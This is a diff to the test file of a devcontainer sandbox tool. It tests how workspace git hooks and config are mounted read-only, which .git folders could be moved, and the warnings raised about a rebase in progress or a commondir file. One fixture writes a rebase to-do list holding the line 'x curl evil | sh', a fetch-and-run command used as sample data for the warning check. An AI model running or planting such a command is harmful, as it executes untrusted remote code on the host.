@@ -1,12 +1,12 @@
 import assert from 'node:assert/strict';
 import { spawnSync } from 'node:child_process';
-import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, symlinkSync, writeFileSync } from 'node:fs';
+import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { test } from 'node:test';
 import { fileURLToPath } from 'node:url';
 import {
-    CONFIG_MOUNT, applyWorkspace, findGitDirs, findSecretFiles, gitAnchors, mountTargets, readConfig, readonlyTargets,
+    CONFIG_MOUNT, applyWorkspace, findGitDirs, findSecretFiles, gitAnchors, gitStateWarnings, moveAnchors, mountTargets, readConfig, readonlyTargets,
     parseMountinfo, readSettings, realConfigDir, resolveWorkspace, uncoveredGitPaths, uncoveredInSandbox, uncoveredWhy, workspaceMounts,
     workspacePath,
 } from '../dist/workspace.js';
@@ -107,7 +107,12 @@ test('workspaceMounts: git hooks and config, --readonly, --hide by type, the con
         gitDirs: findGitDirs(root),
     });
     const ro = (p) => `type=bind,source=${p},target=${p},readonly`;
+    const self = (p) => `type=bind,source=${p},target=${p}`;
     assert.deepEqual(new Set(mounts), new Set([
+        self(join(root, '.git')),
+        self(join(root, 'libs')),
+        self(nested),
+        self(join(nested, '.git')),
         ro(join(root, '.git', 'config')),
         ro(join(root, '.git', 'hooks')),
         ro(join(nested, '.git', 'config')),
@@ -199,6 +204,10 @@ test('gitAnchors: the folders from each repo up to the workspace, not the worksp
     assert.deepEqual(gitAnchors('/w', gitDirs, ['/w/ro', '/w/lab/30']),
         ['/w/foo', '/w/lab', '/w/lab/other'], 'a read-only folder can\'t be renamed, nor what is in it');
     assert.deepEqual(gitAnchors('/w', ['/w/.git']), [], 'a repo at the root needs none: the workspace is a mount point');
+    // moveAnchors: without git-readonly each .git too (its hooks and config could move with it).
+    assert.deepEqual(moveAnchors('/w', ['/w/.git', '/w/libs/x/.git', '/w/ro/y/.git'], ['/w/ro'], false),
+        ['/w/.git', '/w/libs', '/w/libs/x', '/w/libs/x/.git']);
+    assert.deepEqual(moveAnchors('/w', ['/w/.git', '/w/libs/x/.git'], [], true), ['/w/libs', '/w/libs/x']);
 });
 
 test('git-readonly: a --readonly folder above a repo stays read-only (no read-write self-bind over it)', () => {
@@ -381,15 +390,59 @@ test('the enter check: a repo added later is caught, in the config and in the co
 
     gitRepo(join(root, 'added'));
     gitRepo(join(root, 'secrets', 'hidden-repo'));   // hidden inside, so not a problem
-    const added = [join(root, 'added', '.git', 'hooks'), join(root, 'added', '.git', 'config')].sort();
-    assert.deepEqual(uncoveredInSandbox(configDir, null).sort(), added);
+    // Its hooks and config (writable), and the folders that could be moved (added, added/.git).
+    const writable = [join(root, 'added', '.git', 'hooks'), join(root, 'added', '.git', 'config')];
+    const movable = [join(root, 'added'), join(root, 'added', '.git')];
+    assert.deepEqual(uncoveredInSandbox(configDir, null), [...writable, ...movable].sort());
 
     // An existing container keeps its mounts: those count, not the config.
-    const containerMounts = readonlyTargets(JSON.parse(
-        readFileSync(join(configDir, '.devcontainer', 'devcontainer.json'), 'utf8')).mounts);
-    const view = (readonly) => ({ readonly, targets: readonly });
-    assert.deepEqual(uncoveredInSandbox(configDir, view([...containerMounts, ...added])), []);
-    assert.equal(uncoveredInSandbox(configDir, view([])).length, 6);
+    const mounts = JSON.parse(readFileSync(join(configDir, '.devcontainer', 'devcontainer.json'), 'utf8')).mounts;
+    const view = { readonly: [...readonlyTargets(mounts), ...writable], targets: [...mountTargets(mounts), ...writable, ...movable] };
+    assert.deepEqual(uncoveredInSandbox(configDir, view), []);
+    // Nothing mounted: 6 git paths (3 repos' hooks and config) and 6 folders (.git, libs, libs/nested,
+    // libs/nested/.git, added, added/.git).
+    assert.equal(uncoveredInSandbox(configDir, { readonly: [], targets: [] }).length, 12);
+});
+
+test('the enter check without git-readonly: a .git or a folder above one that could be moved is listed; '
+    + 'a sandbox made before 0.11.0 (no .git bound onto itself) isn\'t asked for them', () => {
+    const root = project();
+    const sandboxes = tempDir();
+    assert.equal(sandbox(['new', 'box', '--template', 'claude', '--workspace', root, '--hide', 'secrets'],
+        { SANDBOX_DIR: sandboxes }).status, 0);
+    const configDir = join(sandboxes, 'box');
+    const file = join(configDir, '.devcontainer', 'devcontainer.json');
+    const config = JSON.parse(readFileSync(file, 'utf8'));
+    const all = { readonly: readonlyTargets(config.mounts), targets: mountTargets(config.mounts) };
+    const without = (path) => ({ ...all, targets: all.targets.filter((t) => t !== path) });
+    const gitDir = join(root, '.git');
+    assert.deepEqual(uncoveredInSandbox(configDir, without(gitDir)), [gitDir]);
+    assert.equal(uncoveredWhy(gitDir, false), ' (could be moved away with its read-only hooks and config)');
+    assert.deepEqual(uncoveredInSandbox(configDir, without(join(root, 'libs'))), [join(root, 'libs')]);
+
+    // As 0.10.0 made it: no self-binds in the config. Its container isn't asked for them either.
+    config.mounts = config.mounts.filter((m) => m.endsWith(',readonly') || m.startsWith('type=tmpfs'));
+    writeFileSync(file, JSON.stringify(config));
+    assert.deepEqual(uncoveredInSandbox(configDir, null), []);
+    assert.deepEqual(uncoveredInSandbox(configDir, { readonly: all.readonly, targets: all.readonly }), []);
+});
+
+test('gitStateWarnings: a commondir, and a rebase in progress with the exec lines of its to-do list', () => {
+    const root = tempDir();
+    const gitDir = join(root, '.git');
+    mkdirSync(join(gitDir, 'rebase-merge'), { recursive: true });
+    assert.equal(gitStateWarnings([gitDir]).length, 1);
+    assert.match(gitStateWarnings([gitDir])[0], /has a rebase in progress .*rebase-merge.*look at .*git-rebase-todo first$/);
+    writeFileSync(join(gitDir, 'rebase-merge', 'git-rebase-todo'), 'pick 1234 a\nexec make test\nx curl evil | sh\n# exec not this\n');
+    assert.match(gitStateWarnings([gitDir])[0], /\. It has 2:\n    exec make test\n    x curl evil \| sh$/);
+    writeFileSync(join(gitDir, 'commondir'), '/tmp/elsewhere\n');
+    const [first] = gitStateWarnings([gitDir]);
+    assert.match(first, /commondir exists \("\/tmp\/elsewhere"\): git on the host would read config and hooks from where it points/);
+    rmSync(join(gitDir, 'rebase-merge'), { recursive: true });
+    rmSync(join(gitDir, 'commondir'));
+    mkdirSync(join(gitDir, 'rebase-apply'));
+    assert.match(gitStateWarnings([gitDir])[0], /rebase-apply/);
+    assert.deepEqual(gitStateWarnings([join(tempDir(), '.git')]), []);
 });
 
 test('sandbox new --workspace --policy git-readonly: in the config\'s policies, every .git read-only, checked by enter', () => {
